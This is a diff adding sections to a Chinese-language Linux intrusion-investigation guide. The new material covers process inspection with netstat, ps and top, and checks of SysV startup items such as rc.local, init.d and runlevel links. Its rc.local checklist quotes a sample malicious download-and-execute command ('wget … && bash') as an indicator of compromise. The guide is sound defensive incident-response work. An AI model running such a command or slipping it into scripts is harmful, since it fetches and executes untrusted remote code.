@@ -107,6 +107,8 @@ Linux系统里，执行过命令的用户会在自己的家目录下，生成相
 
 ## 三、异常端口与进程
 
+### netstat
+
 `netstat`：不带参数时，默认显示已建立的非监听连接 + 活跃的 UNIX 域套接字。
 
 ![image-20261008223954032](Linux入侵排查.assets/image-20261008223954032.png)
@@ -184,6 +186,8 @@ root@dev:~# ls -l /proc/1012/exe
 lrwxrwxrwx 1 root root 0 10月  6 22:33 /proc/1012/exe -> /usr/sbin/sshd
 ```
 
+### ps aux
+
 检查异常进程：ps aux
 
 ![image-20261009175327861](Linux入侵排查.assets/image-20261009175327861.png)
@@ -195,7 +199,150 @@ PID   #进程的pid号
 %MEM  #表示进程使用的内存资源百分比
 VSZ   #表示进程的虚拟内存大小（以 KB 为单位）
 RSS   #表示进程的实际内存大小
+TTY	  #进程关联的TTY设备
+STAT  #表示进程的状态，通常包括运行（R）、睡眠（S）、停止（T）、僵死（Z）
+START #进程的启动时间
+TIME  #表示进程的累计CPU占用时间
+COMMAND #表示进程的命令名称和参数
 ```
+
+### top
+
+按 q 即可退出。
+
+![image-20261011231012570](Linux入侵排查.assets/image-20261011231012570.png)
+
+运行以上命令，如果发现有名称不断变化的非授权进程占用大量系统CPU或内存资源时，则可能为恶意程序
+
+确认该进程为恶意进程后，可以使用 kill -9 【PID】 命令结束，或使用防火墙限制进程外联
+
+# 开机启动项排查
+
+## 一、先声明两种体系
+
+| 体系      | 典型发行版                                       | 启动项载体                             | 排查核心                |
+| --------- | ------------------------------------------------ | -------------------------------------- | ----------------------- |
+| SysV init | CentOS 6、Debian 旧版、Ubuntu 14.04 及更早,kylin | /etc/rc.d/`、`/etc/init.d/`、`rc.local | 脚本内容 + 运行级别链接 |
+| Systemd   | CentOS 7+、Ubuntu 15.04+、Debian 8+              | `.service` 单元文件                    | 单元文件 + 依赖关系     |
+
+![image-20261012001341354](Linux入侵排查.assets/image-20261012001341354.png)
+
+快速判断系统初始化方式：
+
+```bash
+ps -p 1 -o comm=          # 输出 init → SysV；输出 systemd → systemd
+systemctl --version 2>/dev/null && echo "systemd 可用"
+```
+
+## 二、SysV体系排查
+
+/etc/rc.d/rc0~6.d，有些ubuntu版本没有rc.d这个目录，如果我自己这个2204就是/etc/rc0~6.d
+
+### 1，运行级别
+
+| 级别 | 状态                            |
+| :--- | :------------------------------ |
+| 0    | 关机                            |
+| 1    | 单用户（救援/修复）             |
+| 2    | 多用户，无 NFS（Debian 系默认） |
+| 3    | 完整命令行（RHEL 系默认）       |
+| 4    | 保留                            |
+| 5    | 图形界面                        |
+| 6    | 重启                            |
+
+### 2，排查位置总览
+
+| 检查点       | 路径                              | 风险说明                     |
+| ------------ | --------------------------------- | ---------------------------- |
+| rc.local     | /etc/rc.local、/etc/rc.d/rc.local | 开机最后执行，最常被植入后门 |
+| init.d脚本   | /etc/init.d/、/etc/rc.d/init.d/   | 服务脚本本身可能被篡改       |
+| 运行级别链接 | /etc/rcN.d/、/etc/rc.d/rcN.d/     | 新增 S 链接 = 新增自启动     |
+| inittab      | /etc/inittab                      | 老系统启动配置               |
+
+### 3，rc.local排查
+
+`rc.local` 是系统启动时最后执行的自定义脚本，几乎所有 SysV 后门都会优先利用它。
+
+排查命令：
+
+```bash
+# 检查文件是否存在、权限、修改时间
+ls -l /etc/rc.local /etc/rc.d/rc.local 2>/dev/null
+stat /etc/rc.local 2>/dev/null
+
+# 查看内容
+cat /etc/rc.local
+cat /etc/rc.d/rc.local
+```
+
+- 出现 `wget` / `curl` 下载并执行远程脚本，例如 `wget http://xx.xx/xx.sh && bash xx.sh`
+- 执行 `/tmp/`、`/dev/shm/` 等临时目录下的文件
+- 调用 `nohup`、`setsid` 后台拉起进程
+- 包含 base64 编码串、混淆的 shell 命令
+- 修改时间与系统其他文件明显不一致
+
+**处置：**
+
+```bash
+# 先备份取证
+cp /etc/rc.local /tmp/evidence/rc.local.bak
+
+# 方法一：直接注释/删除可疑行
+vi /etc/rc.local
+
+# 方法二：若无业务需求，可直接清空
+echo '#!/bin/bash' > /etc/rc.local
+echo 'exit 0' >> /etc/rc.local
+chmod +x /etc/rc.local
+```
+
+### 4，init.d 与 rcN.d 排查
+
+检查 init.d 目录：
+
+```bash
+ls -lt /etc/init.d/ | head -20
+ls -lt /etc/rc.d/init.d/ | head -20     # RHEL 系
+```
+
+按修改时间排序，重点关注**最近新增或修改**的脚本。`/etc/init.d/` 下出现不认识的脚本名（如 `update.sh`、`netmon`、随机字符串），高度可疑。
+
+**检查运行级别链接**：
+
+```bash
+ls -la /etc/rc*.d/           # Debian/Ubuntu
+ls -la /etc/rc.d/rc*.d/      # RHEL/CentOS
+```
+
+正常系统中，`S` 开头的链接数量是有限的（对应已安装服务）。如果发现**陌生的 S 链接**，追踪其指向的脚本内容：
+
+```bash
+root@dev:/etc/rc0.d# readlink -f /etc/rcS.d/S01apparmor
+/etc/init.d/apparmor
+
+## 查看脚本内容
+cat /etc/init.d/apparmor
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
